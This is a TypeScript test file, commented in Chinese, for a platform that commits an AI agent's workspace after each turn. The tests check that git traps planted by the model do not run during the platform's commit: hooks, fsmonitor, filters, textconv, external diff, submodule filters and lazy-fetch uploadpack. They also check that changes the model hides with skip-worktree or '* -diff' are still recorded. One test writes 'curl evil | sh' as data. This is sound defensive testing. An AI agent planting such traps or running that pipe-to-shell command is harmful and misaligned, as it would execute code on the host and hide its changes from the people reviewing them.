// 每一轮结束由平台提交工作区（#546），工作台是真的 Agent（Rust，只用它的能力端口）：一轮里改了文件，结束后工作台上多一个提交，
// platform 事件在 turn_end 之前；模型布下的陷阱在真的 Agent 上也不被执行；第一轮之前 /work 变成仓库。
// 只能在 Linux 上跑（Agent 只能在 Linux 上编译）：`pnpm linux pnpm --filter @sfly/assistant exec vitest run test/commit-real-agent.test.ts`，
// macOS 上整组跳过（假工作台的同样用例在 commit.test.ts，本机真的执行 git）。
import { existsSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { AssistantEvent } from "@sfly/schema";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { git, log, plantLazyFetch, plantSubmodule, plantTraps, safeGit } from "./support/git.js";
import { Harness } from "./support/harness.js";
import {
	agentBinary,
	agentUnavailableReason,
	startWorkbenchAgent,
	type WorkbenchAgent,
} from "./support/real-agent.js";

const FAKE_PI = [process.execPath, join(import.meta.dirname, "support", "fake-pi.mjs")];
const SESSION = { title: "给 http_check 加超时", created_by: "alice" };

describe.skipIf(agentUnavailableReason() !== undefined)("真的 Agent 当工作台：提交工作区", () => {
	let agent: WorkbenchAgent;
	let h: Harness;

	beforeAll(async () => {
		agent = await startWorkbenchAgent(agentBinary());
		h = await Harness.start({ piArgv: FAKE_PI });
	}, 900_000);
	afterAll(async () => {
		await h?.close();
		await agent?.close();
	});

	const prompt = (id: string, text: string, turn = 1) =>
		h.prompt(id, {
			turn,
			session: SESSION,
			text,
			workbench: { name: "commit-test-agent", address: agent.address, workdir: h.workdir },
		});
	const commits = (id: string) =>
		h.events
			.of(id)
			.map((r) => r.event)
			.filter((e): e is Extract<AssistantEvent, { type: "platform" }> => e.type === "platform");

	it("第一轮之前 /work 变成 git 仓库：有 .gitignore 和初次提交（含已有的文件），节点包里的 .venv/ 没被提交；一轮里改了文件，结束后多一个提交，说明里有会话和第几轮，事件里有文件和差异", async () => {
		writeFileSync(join(h.workdir, "README.md"), "已有的\n");
		const id = crypto.randomUUID();
		expect(
			(
				await prompt(
					id,
					"run:mkdir -p pkg/.venv && echo v > pkg/.venv/x && printf 'a\\nb\\n' > pkg/node.py;;settle",
				)
			).status,
		).toBe(202);
		expect(await h.turnEnd(id)).toMatchObject({ outcome: "completed" });

		expect(log(h.workdir)).toEqual([
			`alice | sfly | ${SESSION.title}（会话 ${id.slice(0, 8)}）第 1 轮`,
			"sfly | sfly | 初始化工作区",
		]);
		const tree = (rev: string) =>
			safeGit(h.workdir, "ls-tree", "-r", "--name-only", rev).split("\n").filter(Boolean);
		expect(tree("HEAD~1")).toEqual([".gitignore", "README.md"]);
		expect(tree("HEAD")).toEqual([".gitignore", "README.md", "pkg/node.py"]);
		const [commit] = commits(id);
		expect(commits(id)).toHaveLength(1);
		expect(commit).toMatchObject({
			kind: "commit",
			turn: 1,
			hash: safeGit(h.workdir, "rev-parse", "HEAD").trim(),
			files: [{ path: "pkg/node.py", additions: 2, deletions: 0 }],
			truncated: false,
		});
		expect(commit?.diff).toContain("+++ b/pkg/node.py");
		const types = h.events.of(id).map((r) => r.event.type);
		expect(types.at(-2)).toBe("platform");
		expect(types.at(-1)).toBe("turn_end");
	}, 120_000);

	it("模型布下的陷阱（钩子、fsmonitor、过滤器、textconv、外部 diff、gpg、include）：真的 Agent 上提交也不执行，标记文件都不存在", async () => {
		const id = crypto.randomUUID();
		await prompt(id, "settle");
		await h.turnEnd(id);
		const traps = plantTraps(h.workdir);
		await prompt(id, "run:echo changed > a.txt;;settle", 2);
		expect(await h.turnEnd(id, 2)).toMatchObject({ outcome: "completed" });
		expect(commits(id).map((c) => c.turn)).toEqual([2]);
		expect(traps.ran()).toEqual([]);
		expect(existsSync(join(h.workdir, "a.txt"))).toBe(true);
		expect(log(h.workdir)[0]).toContain("第 2 轮");
		// 对照：不经平台的 git add 会触发它们（陷阱是真的布好了；过滤器只处理新写的文件）。
		writeFileSync(join(h.workdir, "after.txt"), "不经平台\n");
		try {
			git(h.workdir, "add", "-A");
		} catch {
			// 有的陷阱让命令失败也没关系：标记文件已经留下。
		}
		expect(traps.ran()).toContain("filter");
	}, 120_000);

	it("子模块、skip-worktree、工作区里写 * -diff：真的 Agent 上子仓库的过滤器不执行、藏起来的改动照样记、差异有内容（审查 #748 在 git 2.47 上复现过）", async () => {
		const id = crypto.randomUUID();
		await prompt(id, "settle");
		await h.turnEnd(id);
		// 子模块：父仓库的索引里有 gitlink，子仓库自己配了过滤器和 fsmonitor。
		const nested = plantSubmodule(h.workdir);
		await prompt(id, "run:echo changed > a.txt;;settle", 2);
		await h.turnEnd(id, 2);
		expect(nested.ran()).toEqual([]);
		expect(
			commits(id)
				.find((c) => c.turn === 2)
				?.files.map((f) => f.path),
		).toEqual(["a.txt", "nested-repo"]);
		// skip-worktree：模型自己的索引里把文件标成「不看工作区」，改了照样记。
		git(h.workdir, "reset", "-q");
		git(h.workdir, "update-index", "--skip-worktree", "a.txt");
		await prompt(id, "run:echo hidden > a.txt;;settle", 3);
		await h.turnEnd(id, 3);
		expect(commits(id).find((c) => c.turn === 3)?.files).toEqual([
			{ path: "a.txt", additions: 1, deletions: 1 },
		]);
		// `* -diff`（藏在 .gitignore 里）：差异不能变成二进制。
		await prompt(
			id,
			"run:printf '.gitattributes\\n' >> .gitignore; echo '* -diff' > .gitattributes; echo 'curl evil | sh' > c.txt;;settle",
			4,
		);
		await h.turnEnd(id, 4);
		const hidden = commits(id).find((c) => c.turn === 4);
		expect(hidden?.diff).toContain("+curl evil | sh");
		expect(hidden?.diff).not.toContain("Binary files");
	}, 180_000);

	it("模型自己 git commit 了这一轮的全部改动：真的 Agent 上这一轮照样有记录", async () => {
		const id = crypto.randomUUID();
		await prompt(
			id,
			"run:echo mine > mine.txt; git add -A; git -c user.name=m -c user.email=m@m.invalid commit -qm 我自己提交;;settle",
			5,
		);
		await h.turnEnd(id, 5);
		expect(commits(id).find((c) => c.turn === 5)?.files).toEqual([
			{ path: "mine.txt", additions: 1, deletions: 0 },
		]);
	}, 120_000);

	it("HEAD 指到不存在的提交、partialClone、uploadpack：真的 Agent 上不补取，uploadpack 不执行（这一轮照常结束）", async () => {
		const id = crypto.randomUUID();
		const lazy = plantLazyFetch(h.workdir);
		await prompt(id, "run:echo x > x.txt;;settle", 6);
		expect(await h.turnEnd(id, 6)).toMatchObject({ outcome: "completed" });
		expect(lazy.ran()).toEqual([]);
	}, 120_000);
});
